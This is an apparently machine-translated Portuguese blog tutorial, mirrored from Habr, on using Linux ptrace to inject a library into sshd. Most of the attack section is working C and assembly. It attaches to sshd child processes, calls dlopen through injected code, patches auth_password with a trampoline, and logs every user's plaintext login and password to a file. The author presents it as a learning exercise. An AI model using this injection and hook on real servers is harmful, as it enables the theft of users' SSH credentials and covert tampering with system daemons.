<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®üèæ‚Äçüîß üë©üèΩ‚Äçüî¨ üõÄ Uma introdu√ß√£o ao ptrace ou inje√ß√£o de c√≥digo no sshd por divers√£o üë©üèæ‚Äç‚úàÔ∏è üë®üèΩ‚Äçüé§ üß§</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="O objetivo que estabeleci era muito simples: aprender a senha inserida no sshd usando o ptrace. Obviamente, essa √© uma tarefa um tanto artificial, j√° ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Uma introdu√ß√£o ao ptrace ou inje√ß√£o de c√≥digo no sshd por divers√£o</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/430302/"><img src="https://habrastorage.org/webt/ep/w1/el/epw1elpz3alvv_6vifmtdbazam0.png"><br><br>  O objetivo que estabeleci era muito simples: aprender a senha inserida no sshd usando o ptrace.  Obviamente, essa √© uma tarefa um tanto artificial, j√° que existem muitas outras maneiras mais eficazes de alcan√ßar o que voc√™ deseja (e com uma probabilidade muito menor de obter <abbr title="Falha na segmenta√ß√£o">SEGV</abbr> ); no entanto, me pareceu legal fazer exatamente isso. <br><a name="habracut"></a><br><h1>  O que √© ptrace? </h1><br>  Aqueles que est√£o familiarizados com as inje√ß√µes no Windows provavelmente conhecem as fun√ß√µes <code>VirtualAllocEx()</code> , <code>WriteProcessMemory()</code> , <code>ReadProcessMemory()</code> e <code>CreateRemoteThread()</code> .  Essas chamadas permitem alocar mem√≥ria e iniciar threads em outro processo.  No mundo linux, o kernel nos fornece <code>ptrace</code> , gra√ßas ao qual depuradores podem interagir com o processo em execu√ß√£o. <br><br>  O Ptrace oferece v√°rias opera√ß√µes √∫teis de depura√ß√£o, por exemplo: <br><br><ul><li>  PTRACE_ATTACH - permite ingressar em um √∫nico processo, pausando um processo depurado </li><li>  PTRACE_PEEKTEXT - permite ler dados do espa√ßo de endere√ßo de outro processo </li><li>  PTRACE_POKETEXT - permite gravar dados no espa√ßo de endere√ßo de outro processo </li><li>  PTRACE_GETREGS - L√™ o estado atual dos registros do processo </li><li>  PTRACE_SETREGS - registra o estado dos registros do processo </li><li>  PTRACE_CONT - continua a execu√ß√£o do processo depurado </li></ul><br>  Embora essa n√£o seja uma lista completa dos recursos do ptrace, no entanto, encontrei dificuldades devido √† falta de fun√ß√µes familiares do Win32.  Por exemplo, no Windows, voc√™ pode alocar mem√≥ria em outro processo usando a fun√ß√£o <code>VirtualAllocEx()</code> , que retorna um ponteiro para a mem√≥ria rec√©m-alocada.  Como isso n√£o existe no ptrace, voc√™ deve improvisar se quiser incorporar seu c√≥digo em outro processo. <br><br>  Bem, ent√£o, vamos pensar em como assumir o controle de um processo usando o ptrace. <br><br><h1>  No√ß√µes b√°sicas do Ptrace </h1><br>  A primeira coisa que devemos fazer √© ingressar no processo de seu interesse.  Para fazer isso, basta chamar ptrace com o par√¢metro PTRACE_ATTACH: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_ATTACH, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Essa chamada √© simples como um engarrafamento, aceita o PID do processo que queremos ingressar.  Quando uma chamada ocorre, um sinal SIGSTOP √© enviado, o que for√ßa o processo de interesse a parar. <br><br>  Ap√≥s ingressar, h√° um motivo para salvar o estado de todos os registros antes de come√ßarmos a mudar alguma coisa.  Isso nos permitir√° restaurar o programa posteriormente: <br><br><pre> <code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">user_regs_struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">oldregs</span></span></span><span class="hljs-class">;</span></span> ptrace(PTRACE_GETREGS, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;oldregs);</code> </pre><br>  Em seguida, voc√™ precisa encontrar um lugar onde possamos escrever nosso c√≥digo.  A maneira mais f√°cil √© extrair informa√ß√µes do arquivo de mapas, que podem ser encontradas nos procfs para cada processo.  Por exemplo, "/ proc / PID / maps" em um processo sshd em execu√ß√£o no Ubuntu se parece com isso: <br><br><img src="https://habrastorage.org/webt/me/_2/ug/me_2ugeh7hugdyuqx_xfkp-myuy.png"><br><br>  Precisamos encontrar a √°rea de mem√≥ria alocada com o direito de executar (provavelmente "r-xp").  Assim que encontrarmos a √°rea que mais nos conv√©m, por analogia com os registros, salvamos o conte√∫do, para que posteriormente possamos restaurar corretamente o trabalho: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_PEEKTEXT, pid, addr, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Usando o ptrace, voc√™ pode ler uma palavra de dados da m√°quina (32 bits em x86 ou 64 bits em x86_64) no endere√ßo especificado, ou seja, para ler mais dados, √© necess√°rio fazer v√°rias chamadas, aumentando o endere√ßo. <br><br>  <i>Nota: no linux tamb√©m existem process_vm_readv () e process_vm_writev () para trabalhar com o espa√ßo de endere√ßo de outro processo.</i>  <i>No entanto, neste artigo, continuarei com o uso do ptrace.</i>  <i>Se voc√™ quiser fazer algo diferente, √© melhor ler sobre essas fun√ß√µes.</i> <br><br>  Agora que fizemos o backup da √°rea de mem√≥ria de que gostamos, podemos come√ßar a sobrescrever: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_POKETEXT, pid, addr, word);</code> </pre><br>  Como PTRACE_PEEKTEXT, esta chamada pode registrar apenas uma palavra de m√°quina por vez no endere√ßo especificado.  Al√©m disso, escrever mais de uma palavra de m√°quina exigir√° muitas chamadas. <br><br>  Depois de carregar seu c√≥digo, voc√™ precisa transferir o controle para ele.  Para n√£o sobrescrever os dados na mem√≥ria (por exemplo, a pilha), usaremos os registradores salvos anteriormente: <br><br><pre> <code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">user_regs_struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">r</span></span></span><span class="hljs-class">;</span></span> <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(&amp;r, &amp;oldregs, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(struct user_regs_struct)); <span class="hljs-comment"><span class="hljs-comment">// Update RIP to point to our injected code regs.rip = addr_of_injected_code; ptrace(PTRACE_SETREGS, pid, NULL, &amp;r);</span></span></code> </pre><br>  Por fim, podemos continuar a execu√ß√£o com PTRACE_CONT: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_CONT, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Mas como sabemos que nosso c√≥digo terminou de executar?  Usaremos uma interrup√ß√£o de software, tamb√©m conhecida como instru√ß√£o "int 0x03" que gera o SIGTRAP.  Vamos esperar por isso com waitpid (): <br><br><pre> <code class="cpp hljs">waitpid(pid, &amp;status, WUNTRACED);</code> </pre><br>  waitpid () - uma chamada de bloqueio que aguardar√° o processo parar com o identificador PID e gravar√° o motivo da parada na vari√°vel de status.  Aqui, a prop√≥sito, existem v√°rias macros que simplificar√£o a vida para descobrir o motivo da parada. <br><br>  Para descobrir se houve uma parada devido ao SIGTRAP (devido √† chamada int 0x03), podemos fazer o seguinte: <br><br><pre> <code class="cpp hljs">waitpid(pid, &amp;status, WUNTRACED); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (WIFSTOPPED(status) &amp;&amp; WSTOPSIG(status) == SIGTRAP) { <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"SIGTRAP received\n"</span></span>); }</code> </pre><br>  Nesse ponto, nosso c√≥digo incorporado j√° foi executado e tudo o que precisamos fazer √© restaurar o processo ao seu estado original.  Restaure todos os registros: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_SETREGS, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, &amp;origregs);</code> </pre><br>  Em seguida, retornaremos os dados originais na mem√≥ria: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_POKETEXT, pid, addr, word);</code> </pre><br>  E desconecte-se do processo: <br><br><pre> <code class="cpp hljs">ptrace(PTRACE_DETACH, pid, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>);</code> </pre><br>  Isso √© teoria suficiente.  Vamos para a parte mais interessante. <br><br><h1>  Inje√ß√£o de sshd </h1><br>  <i>Eu tenho que avisar que existe alguma chance de descartar o sshd, portanto, tenha cuidado e n√£o tente verificar isso no sistema em funcionamento e, especialmente, no sistema remoto via SSH: D</i> <i><br><br></i>  <i>Al√©m disso, existem v√°rias maneiras melhores de obter o mesmo resultado. Eu demonstro essa apenas como uma maneira divertida de mostrar o poder do ptrace (concordo que isso √© melhor do que injetar no Hello World;)</i> <br><br>  A √∫nica coisa que eu queria fazer era obter a combina√ß√£o de senha de login executando sshd quando o usu√°rio √© autenticado.  Ao visualizar o c√≥digo fonte, podemos ver algo como isto: <br><br>  <a href="">auth-passwd.c</a> <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">/* * Tries to authenticate the user using password. Returns true if * authentication succeeds. */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">auth_password</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Authctxt *authctxt, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *password)</span></span></span><span class="hljs-function"> </span></span>{ ... }</code> </pre><br>  Parece um √≥timo local para tentar remover o nome de usu√°rio / senha transmitidos pelo usu√°rio em texto n√£o criptografado. <br><br>  Queremos encontrar uma assinatura de fun√ß√£o que nos permita encontrar sua [fun√ß√£o] na mem√≥ria.  Eu uso o meu utilit√°rio de desmontagem favorito, radare2: <br><br><img src="https://habrastorage.org/webt/4r/xx/z_/4rxxz_4bv-g5uoo3fiqsxueeefo.png"><br><br>  √â necess√°rio encontrar uma sequ√™ncia de bytes que seja exclusiva e ocorra apenas na fun√ß√£o auth_password.  Para fazer isso, usaremos a pesquisa no radare2: <br><br><img src="https://habrastorage.org/webt/aq/ie/qt/aqieqttr95rwwklbsvyiwnh86no.png"><br><br>  Aconteceu que a sequ√™ncia <code>xor rdx, rdx; cmp rax, 0x400</code>  <code>xor rdx, rdx; cmp rax, 0x400</code> nossos requisitos e √© encontrado apenas uma vez no arquivo ELF inteiro. <br><br>  Como observa√ß√£o ... Se voc√™ n√£o possui essa sequ√™ncia, verifique se possui a vers√£o mais recente, que tamb√©m <a href="">fecha a</a> vulnerabilidade de meados de 2016. (Na vers√£o 7.6, essa sequ√™ncia tamb√©m √© √∫nica - aprox. Por.) <br><br>  O pr√≥ximo passo √© a inje√ß√£o de c√≥digo. <br><br><h1>  Baixar .so para sshd </h1><br>  Para carregar nosso c√≥digo no sshd, criaremos um pequeno stub que nos permitir√° chamar dlopen () e carregar uma biblioteca din√¢mica que j√° implementar√° a substitui√ß√£o de "auth_password". <br><br>  dlopen () √© uma chamada para vincula√ß√£o din√¢mica, que pega o caminho para a biblioteca din√¢mica em argumentos e o carrega no espa√ßo de endere√ßo do processo de chamada.  Esta fun√ß√£o est√° localizada no libdl.so, que se vincula dinamicamente ao aplicativo. <br><br>  Felizmente, no nosso caso, o libdl.so j√° est√° carregado no sshd, ent√£o precisamos apenas executar o dlopen ().  No entanto, devido ao <abbr title="Randomiza√ß√£o do layout do espa√ßo de endere√ßo">ASLR, √©</abbr> muito improv√°vel que o dlopen () esteja sempre no mesmo local, portanto, √© necess√°rio encontrar o endere√ßo na mem√≥ria sshd. <br><br>  Para encontrar o endere√ßo da fun√ß√£o, voc√™ precisa calcular o deslocamento - a diferen√ßa entre o endere√ßo da fun√ß√£o dlopen () e o endere√ßo inicial do libdl.so: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> libdlAddr, dlopenAddr; libdlAddr = (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)dlopen(<span class="hljs-string"><span class="hljs-string">"libdl.so"</span></span>, RTLD_LAZY); dlopenAddr = (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)dlsym(libdlAddr, <span class="hljs-string"><span class="hljs-string">"dlopen"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"Offset: %llx\n"</span></span>, dlopenAddr - libdlAddr);</code> </pre><br>  Agora que calculamos o deslocamento, precisamos encontrar o endere√ßo inicial do libdl.so no arquivo de mapas: <br><br><img src="https://habrastorage.org/webt/pm/vu/ja/pmvuja0gax1gdlqv48bwpeiadu0.png"><br><br>  Conhecendo o endere√ßo base do libdl.so no sshd (0x7f0490a0d000, como segue na captura de tela acima), podemos adicionar um deslocamento e fazer com que o endere√ßo dlopen () chame a partir do c√≥digo de inje√ß√£o. <br><br>  Passaremos todos os endere√ßos necess√°rios pelos registradores usando PTRACE_SETREGS. <br><br>  Tamb√©m √© necess√°rio gravar o caminho para a biblioteca implantada no espa√ßo de endere√ßo sshd, por exemplo: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ptraceWrite</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> pid, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> addr, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *data, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> len)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> word = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (i=<span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; len; i+=<span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(word), word=<span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">memcpy</span></span>(&amp;word, data + i, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(word)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (ptrace(PTRACE_POKETEXT, pid, addr + i, word)) == <span class="hljs-number"><span class="hljs-number">-1</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">printf</span></span>(<span class="hljs-string"><span class="hljs-string">"[!] Error writing process memory\n"</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>); } } } ptraceWrite(pid, (<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)freeaddr, <span class="hljs-string"><span class="hljs-string">"/tmp/inject.so\x00"</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>)</code> </pre><br>  Fazendo o m√°ximo poss√≠vel durante a prepara√ß√£o da inje√ß√£o e carregando os ponteiros para os argumentos diretamente nos registros, podemos facilitar o c√≥digo da inje√ß√£o.  Por exemplo: <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Update RIP to point to our code, which will be just after // our injected library name string regs.rip = (unsigned long long)freeaddr + DLOPEN_STRING_LEN + NOP_SLED_LEN; // Update RAX to point to dlopen() regs.rax = (unsigned long long)dlopenAddr; // Update RDI to point to our library name string regs.rdi = (unsigned long long)freeaddr; // Set RSI as RTLD_LAZY for the dlopen call regs.rsi = 2; // RTLD_LAZY // Update the target process registers ptrace(PTRACE_SETREGS, pid, NULL, &amp;regs);</span></span></code> </pre><br>  Ou seja, a inje√ß√£o de c√≥digo √© bastante simples: <br><br><pre> <code class="cpp hljs">; RSI <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> as value <span class="hljs-string"><span class="hljs-string">'2'</span></span> (RTLD_LAZY) ; RDI <span class="hljs-built_in"><span class="hljs-built_in">set</span></span> as <span class="hljs-keyword"><span class="hljs-keyword">char</span></span>* to shared library path ; RAX contains the address of dlopen call rax <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> <span class="hljs-number"><span class="hljs-number">0x03</span></span></code> </pre><br>  √â hora de criar nossa biblioteca din√¢mica, que ser√° carregada com o c√≥digo de inje√ß√£o. <br><br>  Antes de prosseguirmos, considere uma coisa importante que ser√° usada ... O construtor de biblioteca din√¢mica. <br><br><h1>  Construtor em bibliotecas din√¢micas </h1><br>  Bibliotecas din√¢micas podem executar c√≥digo ap√≥s o carregamento.  Para fazer isso, marque as fun√ß√µes com o decodificador "__atributo __ ((construtor))".  Por exemplo: <br><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; void __attribute__((constructor)) test(void) { printf("Library loaded on dlopen()\n"); }</span></span></span></span></code> </pre> <br>  Voc√™ pode copiar usando um comando simples: <br><br><pre> <code class="bash hljs">gcc -o test.so --shared -fPIC test.c</code> </pre><br>  E depois verifique o desempenho: <br><br><pre> <code class="cpp hljs">dlopen(<span class="hljs-string"><span class="hljs-string">"./test.so"</span></span>, RTLD_LAZY);</code> </pre><br>  Quando a biblioteca carregar, o construtor tamb√©m ser√° chamado: <br><br><img src="https://habrastorage.org/webt/c1/ez/ao/c1ezaodwm4j0tk8mmqmhwhjbl5i.png"><br><br>  Tamb√©m usamos essa funcionalidade para facilitar nossa vida ao injetar c√≥digo no espa√ßo de endere√ßo de outro processo. <br><br><h1>  Biblioteca din√¢mica sshd </h1><br>  Agora que temos a oportunidade de carregar nossa biblioteca din√¢mica, precisamos criar um c√≥digo que altere o comportamento de auth_password () em tempo de execu√ß√£o. <br><br>  Quando nossa biblioteca din√¢mica √© carregada, podemos encontrar o endere√ßo inicial do sshd usando o arquivo "/ proc / self / maps" em procfs.  Estamos procurando uma √°rea com permiss√µes "rx" na qual procuraremos uma sequ√™ncia √∫nica em auth_password (): <br><br><pre> <code class="cpp hljs">d = fopen(<span class="hljs-string"><span class="hljs-string">"/proc/self/maps"</span></span>, <span class="hljs-string"><span class="hljs-string">"r"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(fgets(buffer, <span class="hljs-keyword"><span class="hljs-keyword">sizeof</span></span>(buffer), fd)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"/sshd"</span></span>) &amp;&amp; <span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"rx"</span></span>)) { ptr = strtoull(buffer, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); end = strtoull(<span class="hljs-built_in"><span class="hljs-built_in">strstr</span></span>(buffer, <span class="hljs-string"><span class="hljs-string">"-"</span></span>)+<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-literal"><span class="hljs-literal">NULL</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } }</code> </pre><br>  Como temos v√°rios endere√ßos para pesquisar, procuramos uma fun√ß√£o: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">const</span></span> <span class="hljs-keyword"><span class="hljs-keyword">char</span></span> *search = <span class="hljs-string"><span class="hljs-string">"\x31\xd2\x48\x3d\x00\x04\x00\x00"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(ptr &lt; end) { <span class="hljs-comment"><span class="hljs-comment">// ptr[0] == search[0] added to increase performance during searching // no point calling memcmp if the first byte doesn't match our signature. if (ptr[0] == search[0] &amp;&amp; memcmp(ptr, search, 9) == 0) { break; } ptr++; }</span></span></code> </pre><br>  Quando encontramos uma correspond√™ncia, voc√™ deve usar mprotect () para alterar as permiss√µes na √°rea de mem√≥ria.  Isso ocorre porque a √°rea da mem√≥ria √© leg√≠vel e execut√°vel e s√£o necess√°rias permiss√µes de grava√ß√£o para altera√ß√µes em movimento: <br><br><pre> <code class="cpp hljs">mprotect((<span class="hljs-keyword"><span class="hljs-keyword">void</span></span>*)(((<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span>)ptr / <span class="hljs-number"><span class="hljs-number">4096</span></span>) * <span class="hljs-number"><span class="hljs-number">4096</span></span>), <span class="hljs-number"><span class="hljs-number">4096</span></span>*<span class="hljs-number"><span class="hljs-number">2</span></span>, PROT_READ | PROT_WRITE | PROT_EXEC)</code> </pre><br>  Bem, temos o direito de escrever na √°rea de mem√≥ria desejada e agora √© hora de adicionar um pequeno trampolim no in√≠cio da fun√ß√£o auth_password, que passar√° o controle para o gancho: <br><br><pre> <code class="cpp hljs"><span class="hljs-keyword"><span class="hljs-keyword">char</span></span> jmphook[] = <span class="hljs-string"><span class="hljs-string">"\x48\xb8\x48\x47\x46\x45\x44\x43\x42\x41\xff\xe0"</span></span>;</code> </pre><br>  Isso √© equivalente a este c√≥digo: <br><br><pre> <code class="cpp hljs">mov rax, <span class="hljs-number"><span class="hljs-number">0x4142434445464748</span></span> jmp rax</code> </pre> <br>  Obviamente, o endere√ßo 0x4142434445464748 n√£o √© adequado para n√≥s e ser√° substitu√≠do pelo endere√ßo do nosso gancho: <br><br><pre> <code class="cpp hljs">*(<span class="hljs-keyword"><span class="hljs-keyword">unsigned</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> <span class="hljs-keyword"><span class="hljs-keyword">long</span></span> *)((<span class="hljs-keyword"><span class="hljs-keyword">char</span></span>*)jmphook+<span class="hljs-number"><span class="hljs-number">2</span></span>) = &amp;passwd_hook;</code> </pre> <br>  Agora podemos apenas inserir nosso trampolim no sshd.  Para tornar a inje√ß√£o bonita e limpa, insira o trampolim no in√≠cio da fun√ß√£o: <br><br><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Step back to the start of the function, which is 32 bytes // before our signature ptr -= 32; memcpy(ptr, jmphook, sizeof(jmphook));</span></span></code> </pre><br>  Agora temos que implementar um gancho que lide com o registro de dados que passam.  Devemos ter certeza de que salvamos todos os registros antes do in√≠cio do gancho e restauramos antes de retornar ao c√≥digo original: <br><br><div class="spoiler">  <b class="spoiler_title">C√≥digo fonte do gancho</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-comment"><span class="hljs-comment">// Remember the prolog: push rbp; mov rbp, rsp; // that takes place when entering this function void passwd_hook(void *arg1, char *password) { // We want to store our registers for later asm("push %rsi\n" "push %rdi\n" "push %rax\n" "push %rbx\n" "push %rcx\n" "push %rdx\n" "push %r8\n" "push %r9\n" "push %r10\n" "push %r11\n" "push %r12\n" "push %rbp\n" "push %rsp\n" ); // Our code here, is used to store the username and password char buffer[1024]; int log = open(PASSWORD_LOCATION, O_CREAT | O_RDWR | O_APPEND); // Note: The magic offset of "arg1 + 32" contains a pointer to // the username from the passed argument. snprintf(buffer, sizeof(buffer), "Password entered: [%s] %s\n", *(void **)(arg1 + 32), password); write(log, buffer, strlen(buffer)); close(log); asm("pop %rsp\n" "pop %rbp\n" "pop %r12\n" "pop %r11\n" "pop %r10\n" "pop %r9\n" "pop %r8\n" "pop %rdx\n" "pop %rcx\n" "pop %rbx\n" "pop %rax\n" "pop %rdi\n" "pop %rsi\n" ); // Recover from the function prologue asm("mov %rbp, %rsp\n" "pop %rbp\n" ); ...</span></span></code> </pre><br></div></div><br>  Bem, isso √© tudo ... de certa forma ... <br><br>  Infelizmente, depois de tudo o que foi feito, isso n√£o √© tudo.  Mesmo se a inje√ß√£o do c√≥digo sshd falhar, voc√™ pode perceber que as senhas de usu√°rio que voc√™ est√° procurando ainda n√£o est√£o dispon√≠veis.  Isso ocorre porque o sshd para cada conex√£o cria um novo filho.  √â a nova crian√ßa que processa a conex√£o e √© nele que devemos p√¥r o gancho. <br><br>  Para ter certeza de que estamos trabalhando com filhos sshd, decidi procurar procfs em busca de arquivos de estat√≠sticas que especificam o pai PID sshd.  Assim que esse processo √© encontrado, o injetor inicia para ele. <br><br>  Existem at√© vantagens nisso.  Se tudo der errado e a inje√ß√£o de c√≥digo cair do SIGSEGV, apenas o processo de um usu√°rio ser√° eliminado, e n√£o o processo sshd pai.  N√£o √© o maior consolo, mas claramente torna a depura√ß√£o mais f√°cil. <br><br><h1>  Inje√ß√£o em a√ß√£o </h1><br>  Ok, vamos ver a demonstra√ß√£o: <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><img src="https://asciinema.org/a/5i0dcmskkdwomlv6su2sxx07v.svg"></a> <br><br>  O c√≥digo completo pode ser encontrado <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . <br><br>  Espero que esta viagem tenha lhe dado informa√ß√µes suficientes para se intrometer. <br><br>  Quero agradecer √†s seguintes pessoas e sites que ajudaram a lidar com o ptrace: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Kit de ferramentas de inje√ß√£o de biblioteca din√¢mica Gaffe23</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Grande trabalho de inje√ß√£o EvilSocket</a> </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt430302/">https://habr.com/ru/post/pt430302/</a></p>
